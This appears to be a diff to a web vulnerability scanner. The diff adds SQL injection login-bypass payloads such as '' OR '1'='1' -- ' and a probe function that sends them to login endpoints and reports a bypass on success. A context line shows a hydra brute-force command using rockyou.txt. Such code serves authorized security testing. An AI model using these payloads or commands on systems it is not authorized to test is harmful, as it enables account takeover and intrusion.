@@ -280,7 +280,7 @@ class OWASPFuzzEngine:
             "params": ["header"],
         },
         "A03_sqli": {
-            "tools": ["sqlmap"],
+            "tools": ["auth_sqli_probe", "sqlmap"],
             "params": ["query", "body", "json", "hidden"],
         },
         "A03_xss": {
@@ -328,6 +328,9 @@ class OWASPFuzzEngine:
     # Built-in fallback payloads — only used when no wordlist found on system
     SQLI_QUICK = [
         "'", "''", "1'--", "1 OR 1=1--", "admin'--",
+        "' OR '1'='1' -- ",
+        "' OR 1=1 -- ",
+        "admin' OR '1'='1' -- ",
         "1; SELECT SLEEP(3)--", "1' AND SLEEP(3)--",
     ]
     XSS_QUICK = [
@@ -457,6 +460,9 @@ class OWASPFuzzEngine:
                     qs[pname] = str(clean_params.get(pname, "1"))
                 target_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(qs)))
                 tool_out = self.kali.sqlmap(target_url, param_key, "GET", "")
+
+        elif tool_name == "auth_sqli_probe" and check_id == "A03_sqli":
+            return self._auth_sqli_probe(ep, param_key, param_name)
 
         elif tool_name == "dalfox" and check_id == "A03_xss":
             data = urllib.parse.urlencode(ep.params) if ep.method == "POST" else ""
@@ -794,6 +800,81 @@ class OWASPFuzzEngine:
                 exploit_cmd=f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {urllib.parse.urlparse(ep.url).netloc} http-post-form",
                 remediation="Implement rate limiting / CAPTCHA on auth endpoints.",
             )
+        return None
+
+    def _auth_sqli_probe(self, ep: Endpoint, param_key: str,
+                         param_name: str) -> Optional[Finding]:
+        """Focused SQLi auth-bypass probe for login/auth endpoints."""
+        if ep.method != "POST":
+            return None
+        if not any(k in ep.url.lower() for k in ["/login", "/auth", "/signin", "/session"]):
+            return None
+
+        name_l = param_name.lower()
+        if not any(k in name_l for k in ["user", "email", "login", "name", "id"]):
+            return None
+
+        payloads = [
+            "' OR '1'='1' -- ",
+            "admin' OR '1'='1' -- ",
+            "' OR 1=1 -- ",
+            "' OR ''='",
+        ]
+
+        invalid_markers = [
+            "invalid", "wrong", "incorrect", "failed", "try again",
+            "denied", "blocked", "error",
+        ]
+        success_markers = [
+            "logout", "dashboard", "welcome", "account", "profile", "transfer",
+        ]
+
+        clean_params = {
+            k.split(":")[-1]: v for k, v in ep.params.items()
+            if not k.startswith("header:") and not k.startswith("path:")
+        }
+
+        pass_keys = [k for k in clean_params.keys() if "pass" in k.lower()]
+        for payload in payloads:
+            params = dict(clean_params)
+            params[param_name] = payload
+            for pk in pass_keys:
+                params[pk] = params.get(pk) or "x"
+
+            resp = self.client.post(ep.url, data=params)
+            body = (resp.get("body", "") or "").lower()
+            loc = (resp.get("headers", {}).get("location")
+                   or resp.get("headers", {}).get("Location")
+                   or "").lower()
+
+            looks_failure = any(m in body for m in invalid_markers)
+            looks_success = any(m in body for m in success_markers)
+            redirect_success = (
+                resp.get("status") in (301, 302)
+                and loc
+                and not any(x in loc for x in ["/login", "/signin", "error"])
+            )
+
+            if (looks_success or redirect_success) and not looks_failure:
+                return Finding(
+                    owasp_id="A03", owasp_name="Injection",
+                    title=f"Authentication SQL Injection Bypass: {ep.url}",
+                    risk="Critical", confidence=90,
+                    url=ep.url, method="POST", param=param_key,
+                    payload=payload,
+                    evidence=(
+                        f"Login/auth endpoint accepted SQLi payload in '{param_name}'. "
+                        f"Status={resp.get('status')} redirect={loc[:120]}"
+                    ),
+                    baseline_diff="auth_sqli_probe_success",
+                    tool_output=body[:300],
+                    request_raw=f"POST {ep.url}\n{param_name}={payload}",
+                    response_raw=resp.get("body", "")[:500],
+                    exploit_cmd=f"curl -i -X POST -d '{urllib.parse.urlencode(params)}' '{ep.url}'",
+                    remediation="Use parameterized queries and strict authentication logic; never concatenate input into SQL.",
+                    confirmed=True,
+                    tool="auth_sqli_probe",
+                )
         return None
 
     def _jwt_analysis(self, ep: Endpoint) -> Optional[Finding]:
